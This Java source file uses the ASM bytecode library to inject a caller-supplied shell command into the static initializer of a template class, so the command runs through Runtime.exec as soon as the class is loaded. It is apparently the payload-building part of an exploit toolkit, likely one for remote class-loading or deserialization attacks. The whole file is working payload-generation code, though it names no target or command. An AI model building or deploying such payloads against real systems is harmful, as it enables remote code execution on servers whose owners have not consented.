package util;

import java.io.InputStream;
import org.objectweb.asm.*;


/**
 * @Classname Transformers
 * @Description Insert command to the template classfile
 * @Author Welkin
 */
public class Transformers {

    public static byte[] insertCommand(InputStream inputStream, String command) throws Exception{

        ClassReader cr = new ClassReader(inputStream);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        ClassVisitor cv = new TransformClass(cw,command);

        cr.accept(cv, 2);
        return cw.toByteArray();
    }

    static class TransformClass extends ClassVisitor{

        String command;

        TransformClass(ClassVisitor classVisitor, String command){
            super(Opcodes.ASM7,classVisitor);
            this.command = command;
        }

        @Override
        public MethodVisitor visitMethod(
                final int access,
                final String name,
                final String descriptor,
                final String signature,
                final String[] exceptions) {
            MethodVisitor mv = cv.visitMethod(access, name, descriptor, signature, exceptions);
            if(name.equals("<clinit>")){
                return new TransformMethod(mv,command);
            }else{
                return mv;
            }
        }
    }

    static class TransformMethod extends MethodVisitor{

        String command;

        TransformMethod(MethodVisitor methodVisitor,String command) {
            super(Opcodes.ASM7, methodVisitor);
            this.command = command;
        }

        @Override
        public void visitCode(){

            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            mv.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
            mv.visitLabel(label0);
            mv.visitLdcInsn(command);
            mv.visitVarInsn(Opcodes.ASTORE, 0);
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            mv.visitVarInsn(Opcodes.ALOAD, 0);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
            mv.visitInsn(Opcodes.POP);
            mv.visitLabel(label1);
            Label label3 = new Label();
            mv.visitJumpInsn(Opcodes.GOTO, label3);
            mv.visitLabel(label2);
            mv.visitVarInsn(Opcodes.ASTORE, 0);
            mv.visitVarInsn(Opcodes.ALOAD, 0);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
            mv.visitLabel(label3);
        }
    }

}
